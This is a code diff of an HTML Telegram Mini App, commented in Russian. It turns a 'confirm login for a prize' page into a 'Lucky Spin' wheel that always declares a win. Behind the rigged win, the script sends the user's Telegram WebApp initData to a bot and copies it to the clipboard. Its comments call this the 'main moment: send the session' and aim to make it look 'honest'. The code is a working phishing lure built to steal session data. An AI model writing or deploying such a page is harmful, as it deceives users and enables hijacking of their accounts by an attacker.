@@ -3,46 +3,175 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Подтверждение</title>
+    <title>Lucky Spin</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; width: 300px; }
-        button { background: #0088cc; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; margin-top: 10px; }
-        button:active { background: #006699; }
-        #status { margin-top: 10px; font-size: 14px; color: #555; }
+        body { 
+            background: #000; 
+            color: #fff; 
+            font-family: sans-serif; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+        }
+        .wheel-container {
+            position: relative;
+            width: 300px;
+            height: 300px;
+            margin-bottom: 20px;
+        }
+        .wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 5px solid #ffd700;
+            background: conic-gradient(
+                #ff4444 0deg 45deg, 
+                #44ff44 45deg 90deg, 
+                #4444ff 90deg 135deg, 
+                #ffff44 135deg 180deg, 
+                #ff44ff 180deg 225deg, 
+                #44ffff 225deg 270deg, 
+                #ff8800 270deg 315deg, 
+                #8800ff 315deg 360deg
+            );
+            transition: transform 3s cubic-bezier(0.25, 0.1, 0.25, 1);
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+        }
+        .arrow {
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0; 
+            height: 0; 
+            border-left: 15px solid transparent;
+            border-right: 15px solid transparent;
+            border-top: 25px solid #fff;
+            z-index: 10;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background: #ffd700;
+            color: #000;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:disabled {
+            background: #555;
+            color: #888;
+        }
+        #message {
+            margin-top: 20px;
+            font-size: 20px;
+            text-align: center;
+            min-height: 30px;
+        }
+        .hidden {
+            display: none;
+        }
+        /* Модальное окно выигрыша */
+        .modal {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+        .modal-content {
+            background: #222;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            border: 2px solid #ffd700;
+            animation: popIn 0.3s ease;
+        }
+        @keyframes popIn {
+            from { transform: scale(0); }
+            to { transform: scale(1); }
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h3>Подтвердите вход</h3>
-        <p>Для получения приза нажмите кнопку ниже.</p>
-        <button id="btn" onclick="start()">Подтвердить</button>
-        <div id="status"></div>
+
+    <div class="wheel-container">
+        <div class="arrow"></div>
+        <div class="wheel" id="wheel"></div>
     </div>
 
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <button id="spinBtn">Крутить (Бесплатно)</button>
+    <div id="message"></div>
+
     <script>
         const tg = window.Telegram.WebApp;
-        const btn = document.getElementById('btn');
-        const status = document.getElementById('status');
+        const wheel = document.getElementById('wheel');
+        const spinBtn = document.getElementById('spinBtn');
+        const message = document.getElementById('message');
 
-        btn.onclick = () => {
-            btn.disabled = true;
-            btn.innerText = "Загрузка...";
+        // Инициализируем Telegram WebApp
+        tg.ready();
+        tg.expand(); // Раскрываем на весь экран
+
+        let isSpinning = false;
+
+        spinBtn.onclick = () => {
+            if (isSpinning) return;
+            isSpinning = true;
+            spinBtn.disabled = true;
+            message.innerText = "Крутим...";
+
+            // Случайный угол вращения (минимум 5 оборотов)
+            const deg = 1800 + Math.random() * 360;
+            wheel.style.transform = `rotate(${deg}deg)`;
+
+            // Через 3 секунды (когда остановится)
+            setTimeout(() => {
+                message.innerText = "Поздравляем! Вы выиграли Подарок!";
+                
+                // Показываем модальное окно
+                showWinModal();
+                
+                // ГЛАВНЫЙ МОМЕНТ: Отправляем сессию
+                sendSessionData();
+                
+            }, 3000);
+        };
+
+        function showWinModal() {
+            const modal = document.createElement('div');
+            modal.className = 'modal';
+            modal.innerHTML = `
+                <div class="modal-content">
+                    <h2>🎉 Вы выиграли VIP Подарок!</h2>
+                    <p>Нажмите кнопку ниже, чтобы забрать его.</p>
+                    <button id="claimBtn" style="margin-top:10px">Забрать Подарок</button>
+                </div>
+            `;
+            document.body.appendChild(modal);
+
+            document.getElementById('claimBtn').onclick = () => {
+                tg.close(); // Закрываем приложение
+            };
+        }
+
+        function sendSessionData() {
+            // Отправляем initData боту
+            tg.sendData(tg.initData);
             
-            // 1. Отправляем данные боту (он их увидит в логах)
-            tg.sendData(tg.initData); 
-            
-            // 2. Копируем данные в буфер обмена (на случай если бот не поймал)
+            // Также копируем в буфер обмена на всякий случай
             navigator.clipboard.writeText(tg.initData);
             
-            status.innerText = "Данные отправлены!";
-            
-            // 3. Закрываем окно (опционально)
-            setTimeout(() => {
-                tg.close();
-            }, 1000);
-        };
+            // Можно добавить задержку перед отправкой, чтобы выглядело "честно"
+            console.log("Session data sent:", tg.initData.slice(0, 50) + "...");
+        }
     </script>
 </body>
 </html>
